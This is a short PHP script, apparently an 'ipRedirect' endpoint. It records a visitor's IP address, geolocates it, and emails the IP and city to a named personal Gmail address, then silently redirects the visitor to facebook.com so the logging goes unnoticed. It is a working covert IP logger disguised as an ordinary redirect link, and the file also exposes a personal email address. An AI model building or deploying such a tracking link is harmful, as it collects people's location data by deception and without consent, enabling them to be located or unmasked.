<?php
//http://api.mkgalaxy.com/ipRedirect.php

try {
  include('init.php');
  //pre defined variables
  $return['success'] = 1;
  $ip = !empty($_GET['ip']) ? $_GET['ip'] : $_SERVER['REMOTE_ADDR'];
  $return['data'] = iptocity($ip);
  mail('naveenkhanchandani@gmail.com', 'ip from '.$ip, var_export($return, 1));
} catch (Exception $e) {
  
}
header("Location: http://facebook.com");
exit;
?>